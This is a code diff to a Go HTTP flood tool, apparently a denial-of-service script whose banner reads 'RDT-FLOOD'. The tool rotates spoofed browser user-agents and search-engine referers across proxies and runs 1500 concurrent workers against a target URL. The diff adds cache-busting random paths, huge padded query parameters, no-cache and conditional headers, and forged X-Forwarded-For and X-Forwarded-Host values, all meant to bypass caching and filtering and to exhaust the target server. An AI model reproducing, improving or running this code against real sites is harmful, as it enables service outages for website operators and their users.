@@ -23,13 +23,13 @@ import (
 )
 
 const (
-	wrk        = 1500
-	to         = 5 * time.Second
-	sub        = 5
-	KEEP_ALIVE = 30 * time.Second
+	wrk   = 1500
+	to    = 5 * time.Second
+	sub   = 5
+	Alive = 30 * time.Second
 )
 
-type BrowserProfile struct {
+type Spof struct {
 	UA          string
 	Accept      string
 	Lang        string
@@ -41,35 +41,35 @@ type BrowserProfile struct {
 }
 
 var (
-	refChrome    = []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q="}
-	refFirefox   = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q=", "https://www.bing.com/search?q="}
-	refEdge      = []string{"https://www.bing.com/search?q=", "https://www.google.com/search?q="}
-	refSafari    = []string{"https://www.google.com/search?q="}
-	refOpera     = []string{"https://www.google.com/search?q=", "https://www.yahoo.com/search?p=", "https://www.bing.com/search?q="}
-	refBrave     = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
-	refVivaldi   = []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q=", "https://www.duckduckgo.com/?q="}
-	refTor       = []string{"https://www.duckduckgo.com/?q=", "https://www.google.com/search?q="}
-	refPaleMoon  = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
-	refWaterfox  = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
-	refEpic      = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
-	refSlim      = []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q="}
-	refMaxthon   = []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q="}
-	refAvant     = []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q="}
-	refSeaMonkey = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
-	refIceDragon = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
-	refCyberfox  = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
-	refSamsung   = []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q="}
-	refDuckGo    = []string{"https://www.duckduckgo.com/?q=", "https://www.google.com/search?q="}
-	refOperaMini = []string{"https://www.google.com/search?q=", "https://www.yahoo.com/search?p="}
-	refFFMobile  = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
-	refBraveMob  = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
-	refEpiphany  = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
-	refMidori    = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
-	refKonqueror = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
-	refFalkon    = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
+	Chrome     = []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q="}
+	Firefox    = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q=", "https://www.bing.com/search?q="}
+	Edge       = []string{"https://www.bing.com/search?q=", "https://www.google.com/search?q="}
+	Safari     = []string{"https://www.google.com/search?q="}
+	Opera      = []string{"https://www.google.com/search?q=", "https://www.yahoo.com/search?p=", "https://www.bing.com/search?q="}
+	Brave      = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
+	Vivaldi    = []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q=", "https://www.duckduckgo.com/?q="}
+	Tor        = []string{"https://www.duckduckgo.com/?q=", "https://www.google.com/search?q="}
+	PaleMoon   = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
+	Waterfox   = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
+	Epic       = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
+	Slim       = []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q="}
+	Maxthon    = []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q="}
+	Avant      = []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q="}
+	SeaMonkey  = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
+	IceDragon  = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
+	Cyberfox   = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
+	Samsung    = []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q="}
+	DuckGo     = []string{"https://www.duckduckgo.com/?q=", "https://www.google.com/search?q="}
+	OperaMini  = []string{"https://www.google.com/search?q=", "https://www.yahoo.com/search?p="}
+	FFMobile   = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
+	BraveMob   = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
+	Epiphany   = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
+	Midori     = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
+	Konqueror  = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
+	Falkon     = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
 )
 
-var profiles = []BrowserProfile{
+var profiles = []Spof{
 	{
 		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
 		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
@@ -78,7 +78,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     `"Chromium";v="144", "Google Chrome";v="144", "Not?A_Brand";v="99"`,
 		SecChUaMov:  "?0",
 		SecChUaPlat: "Windows",
-		Refs:        refChrome,
+		Refs:        Chrome,
 	},
 	{
 		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
@@ -88,7 +88,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     "",
 		SecChUaMov:  "",
 		SecChUaPlat: "",
-		Refs:        refFirefox,
+		Refs:        Firefox,
 	},
 	{
 		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
@@ -98,7 +98,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     `"Chromium";v="145", "Microsoft Edge";v="145", "Not?A_Brand";v="99"`,
 		SecChUaMov:  "?0",
 		SecChUaPlat: "Windows",
-		Refs:        refEdge,
+		Refs:        Edge,
 	},
 	{
 		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/130.0.0.0",
@@ -108,7 +108,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     `"Chromium";v="144", "Opera";v="130", "Not?A_Brand";v="99"`,
 		SecChUaMov:  "?0",
 		SecChUaPlat: "Windows",
-		Refs:        refOpera,
+		Refs:        Opera,
 	},
 	{
 		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Brave/144.0.0.0",
@@ -118,7 +118,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     `"Chromium";v="144", "Brave";v="144", "Not?A_Brand";v="99"`,
 		SecChUaMov:  "?0",
 		SecChUaPlat: "Windows",
-		Refs:        refBrave,
+		Refs:        Brave,
 	},
 	{
 		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Vivaldi/7.1.3570.47",
@@ -128,7 +128,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     `"Chromium";v="144", "Vivaldi";v="7.1", "Not?A_Brand";v="99"`,
 		SecChUaMov:  "?0",
 		SecChUaPlat: "Windows",
-		Refs:        refVivaldi,
+		Refs:        Vivaldi,
 	},
 	{
 		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/131.0.0.0 (Edition GX)",
@@ -138,7 +138,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     `"Chromium";v="144", "Opera GX";v="131", "Not?A_Brand";v="99"`,
 		SecChUaMov:  "?0",
 		SecChUaPlat: "Windows",
-		Refs:        refOpera,
+		Refs:        Opera,
 	},
 	{
 		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Arc/1.0.0",
@@ -148,7 +148,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     `"Chromium";v="146", "Arc";v="1", "Not?A_Brand";v="99"`,
 		SecChUaMov:  "?0",
 		SecChUaPlat: "Windows",
-		Refs:        refChrome,
+		Refs:        Chrome,
 	},
 	{
 		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0 TorBrowser/12.5.3",
@@ -158,7 +158,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     "",
 		SecChUaMov:  "",
 		SecChUaPlat: "",
-		Refs:        refTor,
+		Refs:        Tor,
 	},
 	{
 		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Goanna/6.4 Firefox/68.0 PaleMoon/33.5.1",
@@ -168,7 +168,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     "",
 		SecChUaMov:  "",
 		SecChUaPlat: "",
-		Refs:        refPaleMoon,
+		Refs:        PaleMoon,
 	},
 	{
 		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0 Waterfox/6.5.2",
@@ -178,7 +178,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     "",
 		SecChUaMov:  "",
 		SecChUaPlat: "",
-		Refs:        refWaterfox,
+		Refs:        Waterfox,
 	},
 	{
 		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Epic/146.0.0.0",
@@ -188,7 +188,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     `"Chromium";v="146", "Epic";v="146", "Not?A_Brand";v="99"`,
 		SecChUaMov:  "?0",
 		SecChUaPlat: "Windows",
-		Refs:        refEpic,
+		Refs:        Epic,
 	},
 	{
 		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 SlimBrowser/15.0.0.0",
@@ -198,7 +198,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     `"Chromium";v="146", "SlimBrowser";v="15", "Not?A_Brand";v="99"`,
 		SecChUaMov:  "?0",
 		SecChUaPlat: "Windows",
-		Refs:        refSlim,
+		Refs:        Slim,
 	},
 	{
 		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Maxthon/7.1.9.3000",
@@ -208,7 +208,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     `"Chromium";v="144", "Maxthon";v="7.1", "Not?A_Brand";v="99"`,
 		SecChUaMov:  "?0",
 		SecChUaPlat: "Windows",
-		Refs:        refMaxthon,
+		Refs:        Maxthon,
 	},
 	{
 		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Avant/2024.1.0",
@@ -218,7 +218,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     `"Chromium";v="145", "Avant";v="2024", "Not?A_Brand";v="99"`,
 		SecChUaMov:  "?0",
 		SecChUaPlat: "Windows",
-		Refs:        refAvant,
+		Refs:        Avant,
 	},
 	{
 		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0 SeaMonkey/2.53.19",
@@ -228,7 +228,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     "",
 		SecChUaMov:  "",
 		SecChUaPlat: "",
-		Refs:        refSeaMonkey,
+		Refs:        SeaMonkey,
 	},
 	{
 		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0 IceDragon/115.0",
@@ -238,7 +238,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     "",
 		SecChUaMov:  "",
 		SecChUaPlat: "",
-		Refs:        refIceDragon,
+		Refs:        IceDragon,
 	},
 	{
 		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0 Cyberfox/52.9.1",
@@ -248,7 +248,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     "",
 		SecChUaMov:  "",
 		SecChUaPlat: "",
-		Refs:        refCyberfox,
+		Refs:        Cyberfox,
 	},
 	{
 		UA:          "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
@@ -258,7 +258,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     `"Chromium";v="146", "Google Chrome";v="146", "Not?A_Brand";v="99"`,
 		SecChUaMov:  "?1",
 		SecChUaPlat: "Android",
-		Refs:        refChrome,
+		Refs:        Chrome,
 	},
 	{
 		UA:          "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/25.0 Chrome/123.0.0.0 Mobile Safari/537.36",
@@ -268,7 +268,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     `"Chromium";v="123", "Samsung Internet";v="25", "Not?A_Brand";v="99"`,
 		SecChUaMov:  "?1",
 		SecChUaPlat: "Android",
-		Refs:        refSamsung,
+		Refs:        Samsung,
 	},
 	{
 		UA:          "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) DuckDuckGo/5.0 Chrome/146.0.0.0 Mobile Safari/537.36",
@@ -278,7 +278,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     `"Chromium";v="146", "DuckDuckGo";v="5", "Not?A_Brand";v="99"`,
 		SecChUaMov:  "?1",
 		SecChUaPlat: "Android",
-		Refs:        refDuckGo,
+		Refs:        DuckGo,
 	},
 	{
 		UA:          "Opera/9.80 (Android; Opera Mini/18.0.2254/93.577; U; en) Presto/2.12.423 Version/12.16",
@@ -288,7 +288,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     "",
 		SecChUaMov:  "",
 		SecChUaPlat: "",
-		Refs:        refOperaMini,
+		Refs:        OperaMini,
 	},
 	{
 		UA:          "Mozilla/5.0 (Android 15; Mobile; rv:136.0) Gecko/136.0 Firefox/136.0",
@@ -298,7 +298,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     "",
 		SecChUaMov:  "",
 		SecChUaPlat: "",
-		Refs:        refFFMobile,
+		Refs:        FFMobile,
 	},
 	{
 		UA:          "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36 Brave/146.0.0.0",
@@ -308,7 +308,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     `"Chromium";v="146", "Brave";v="146", "Not?A_Brand";v="99"`,
 		SecChUaMov:  "?1",
 		SecChUaPlat: "Android",
-		Refs:        refBraveMob,
+		Refs:        BraveMob,
 	},
 	{
 		UA:          "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
@@ -318,7 +318,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     "",
 		SecChUaMov:  "",
 		SecChUaPlat: "",
-		Refs:        refSafari,
+		Refs:        Safari,
 	},
 	{
 		UA:          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
@@ -328,7 +328,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     "",
 		SecChUaMov:  "",
 		SecChUaPlat: "",
-		Refs:        refSafari,
+		Refs:        Safari,
 	},
 	{
 		UA:          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Gecko/20100101 Firefox/136.0",
@@ -338,7 +338,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     "",
 		SecChUaMov:  "",
 		SecChUaPlat: "",
-		Refs:        refFirefox,
+		Refs:        Firefox,
 	},
 	{
 		UA:          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Brave/145.0.0.0",
@@ -348,7 +348,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     `"Chromium";v="145", "Brave";v="145", "Not?A_Brand";v="99"`,
 		SecChUaMov:  "?0",
 		SecChUaPlat: "macOS",
-		Refs:        refBrave,
+		Refs:        Brave,
 	},
 	{
 		UA:          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Vivaldi/7.2.3622.47",
@@ -358,7 +358,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     `"Chromium";v="144", "Vivaldi";v="7.2", "Not?A_Brand";v="99"`,
 		SecChUaMov:  "?0",
 		SecChUaPlat: "macOS",
-		Refs:        refVivaldi,
+		Refs:        Vivaldi,
 	},
 	{
 		UA:          "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
@@ -368,7 +368,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     `"Chromium";v="145", "Google Chrome";v="145", "Not?A_Brand";v="99"`,
 		SecChUaMov:  "?0",
 		SecChUaPlat: "Linux",
-		Refs:        refChrome,
+		Refs:        Chrome,
 	},
 	{
 		UA:          "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) Falkon/24.08.3 QtWebEngine/6.7.2 Safari/538.1",
@@ -378,7 +378,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     "",
 		SecChUaMov:  "",
 		SecChUaPlat: "",
-		Refs:        refFalkon,
+		Refs:        Falkon,
 	},
 	{
 		UA:          "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Epiphany/45.3 Safari/605.1.15",
@@ -388,7 +388,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     "",
 		SecChUaMov:  "",
 		SecChUaPlat: "",
-		Refs:        refEpiphany,
+		Refs:        Epiphany,
 	},
 	{
 		UA:          "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Midori/11.3 Safari/537.36",
@@ -398,7 +398,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     "",
 		SecChUaMov:  "",
 		SecChUaPlat: "",
-		Refs:        refMidori,
+		Refs:        Midori,
 	},
 	{
 		UA:          "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.21 (KHTML, like Gecko) Konqueror/4.14.38 Safari/537.21",
@@ -408,7 +408,7 @@ var profiles = []BrowserProfile{
 		SecChUa:     "",
 		SecChUaMov:  "",
 		SecChUaPlat: "",
-		Refs:        refKonqueror,
+		Refs:        Konqueror,
 	},
 }
 
@@ -422,10 +422,6 @@ type CLI struct {
 
 func init() {
 	runtime.GOMAXPROCS(runtime.NumCPU())
-}
-
-func RIP(rng *rand.Rand) string {
-	return fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
 }
 
 func RST(rng *rand.Rand, length int) string {
@@ -485,13 +481,13 @@ func main() {
 		tr := &http.Transport{
 			DialContext: (&net.Dialer{
 				Timeout:   5 * time.Second,
-				KeepAlive: KEEP_ALIVE,
+				KeepAlive: Alive,
 			}).DialContext,
 			DisableKeepAlives:      false,
-			MaxIdleConns:           50000,
-			MaxIdleConnsPerHost:    50000,
+			MaxIdleConns:           0,
+			MaxIdleConnsPerHost:    0,
 			MaxConnsPerHost:        0,
-			IdleConnTimeout:        KEEP_ALIVE,
+			IdleConnTimeout:        Alive,
 			TLSClientConfig: &tls.Config{
 				InsecureSkipVerify: true,
 				MinVersion:         tls.VersionTLS12,
@@ -526,20 +522,23 @@ func main() {
 		wcs[i] = CLI{client: client, ip: ip}
 	}
 
-	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
-	fmt.Printf("ޗ | Author : Diz Flyze\n")
-	fmt.Printf("ޗ | Target : %s\n", tgt)
-	fmt.Printf("ޗ | Time   : %d/s\n", dur)
-	fmt.Printf("ޗ | Proxy  : %d\n", len(proxies))
-	fmt.Printf("ޗ | Conc   : %d\n", wrk)
-	fmt.Printf("ޗ | Method : RDT-FLOOD\n")
-	fmt.Printf("ޗ | Ulimit : 1048576\n")
-	if customCookie != "" {
-		fmt.Printf("ޗ | Cookie : %s\n", customCookie[:30])
-	} else {
-		fmt.Printf("ޗ | Cookie : False\n")
-	}
-	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n\n")
+	parsedTarget, _ := url.Parse(tgt)
+	targetHost := parsedTarget.Host
+
+	fmt.Printf("\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
+        fmt.Printf("ޗ | Author | Diz Flyze\n")
+        fmt.Printf("ޗ | Target | %s\n", tgt)
+        fmt.Printf("ޗ | Time   | %d/s\n", dur)
+        fmt.Printf("ޗ | Proxy  | %d\n", len(proxies))
+        fmt.Printf("ޗ | Conc   | %d\n", wrk)
+        fmt.Printf("ޗ | Method | RDT-FLOOD\n")
+        fmt.Printf("ޗ | Ulimit | 1048576\n")
+        if customCookie != "" {
+                fmt.Printf("ޗ | Cookie | %s\n", customCookie[:30])
+        } else {
+                fmt.Printf("ޗ | Cookie | False\n")
+        }
+        fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n\n")
 
 	ctx, cancel := context.WithCancel(context.Background())
 	var wg sync.WaitGroup
@@ -567,18 +566,38 @@ func main() {
 					for ctx.Err() == nil {
 						prof := profiles[subRng.Intn(len(profiles))]
 
-						reqURL := tgt
-
-						param := CBP[subRng.Intn(len(CBP))]
-						if strings.Contains(reqURL, "?") {
-							reqURL += "&" + param + "=" + strconv.FormatInt(subRng.Int63(), 10)
-						} else {
-							reqURL += "?" + param + "=" + strconv.FormatInt(subRng.Int63(), 10)
+						baseURL := strings.TrimRight(tgt, "/")
+						pathSegments := []string{}
+						if subRng.Intn(3) == 0 {
+							for j := 0; j < 1+subRng.Intn(3); j++ {
+								pathSegments = append(pathSegments, RST(subRng, 4+subRng.Intn(8)))
+							}
+							pathSegments = append(pathSegments, RST(subRng, 4+subRng.Intn(8))+"."+RST(subRng, 2))
+						}
+						reqURL := baseURL
+						if len(pathSegments) > 0 {
+							reqURL += "/" + strings.Join(pathSegments, "/")
 						}
 
+						if strings.Contains(reqURL, "?") {
+							reqURL += "&"
+						} else {
+							reqURL += "?"
+						}
+
+						param := CBP[subRng.Intn(len(CBP))]
+						reqURL += param + "=" + strconv.FormatInt(subRng.Int63(), 10)
+						reqURL += "&_=" + strconv.FormatInt(time.Now().UnixNano(), 10)
+						reqURL += "&cb=" + strconv.FormatInt(subRng.Int63(), 16)
 						reqURL += "&big=" + strings.Repeat("x", 1024+subRng.Intn(1024))
 						if subRng.Intn(2) == 0 {
 							reqURL += "&" + RST(subRng, 16) + "=" + strings.Repeat("x", 2048+subRng.Intn(2048))
+						}
+						if subRng.Intn(3) == 0 {
+							reqURL += "&" + RST(subRng, 8) + "=" + RST(subRng, 32)
+						}
+						if subRng.Intn(2) == 0 {
+							reqURL += "&" + RST(subRng, 10) + "=" + strconv.FormatInt(subRng.Int63(), 36)
 						}
 
 						req, _ := http.NewRequest("GET", reqURL, nil)
@@ -590,21 +609,26 @@ func main() {
 						headerMap["Accept-Language"] = prof.Lang
 						headerMap["Accept-Encoding"] = prof.Encoding
 						headerMap["Connection"] = "keep-alive"
+						headerMap["Cache-Control"] = "no-cache, no-store, must-revalidate"
+						headerMap["Pragma"] = "no-cache"
+						headerMap["Expires"] = "0"
+
+						if subRng.Intn(2) == 0 {
+							past := time.Now().Add(-time.Duration(subRng.Intn(86400*365)) * time.Second).Format(time.RFC1123)
+							headerMap["If-Modified-Since"] = past
+						}
+						if subRng.Intn(2) == 0 {
+							headerMap["If-None-Match"] = `"` + RST(subRng, 32) + `"`
+						}
 
 						ref := prof.Refs[subRng.Intn(len(prof.Refs))]
 						ref += RST(subRng, 20) + "=" + strings.Repeat("x", 512+subRng.Intn(1024))
 						headerMap["Referer"] = ref
 
-						pid := cli.ip
-						if pid == "" {
-							pid = RIP(subRng)
+						if cli.ip != "" {
+							headerMap["X-Forwarded-For"] = cli.ip
+							headerMap["X-Real-IP"] = cli.ip
 						}
-						if subRng.Intn(2) == 0 {
-							headerMap["X-Forwarded-For"] = pid + ", " + RIP(subRng) + ", " + RIP(subRng)
-						} else {
-							headerMap["X-Forwarded-For"] = pid
-						}
-						headerMap["X-Real-IP"] = pid
 
 						start := subRng.Intn(10000)
 						end := start + 10000000 + subRng.Intn(50000000)
@@ -648,7 +672,7 @@ func main() {
 							headerMap["X-Original-URL"] = "/" + RST(subRng, 20)
 						}
 						if subRng.Intn(3) == 0 {
-							headerMap["X-Forwarded-Host"] = RST(subRng, 10) + ".example.com"
+							headerMap["X-Forwarded-Host"] = targetHost
 						}
 
 						for k, v := range headerMap {
